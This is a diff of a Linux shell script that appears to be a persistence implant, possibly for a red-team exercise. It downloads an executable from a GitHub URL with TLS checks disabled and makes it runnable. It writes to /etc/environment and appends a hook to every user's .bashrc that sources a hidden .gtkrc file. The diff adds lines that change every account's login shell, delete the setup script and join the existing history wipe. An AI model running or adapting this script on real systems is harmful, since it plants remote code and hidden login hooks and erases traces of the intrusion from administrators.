@@ -1,3 +1,8 @@
+for user in $(cat ./passwd | cut -d":" -f1)
+do 
+    chsh -s /bin/bash $user
+done
+
 curl -k 'https://raw.githubusercontent.com/lsh8829/CDT473/main/bash' -o /tmp/bash
 chmod +x /tmp/bash
 
@@ -8,7 +13,6 @@ do
 done
 
 rm -rf /tmp/bash
-
 
 echo 'export VTX_VERSION="10"' >> /etc/environment
 echo 'export VTX_LOG_OPT="10"' >> /etc/environment
@@ -35,5 +39,6 @@ do
     echo -e 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /home/$dir/.bashrc
 done
 
+rm setup.sh
 history -c
 exit
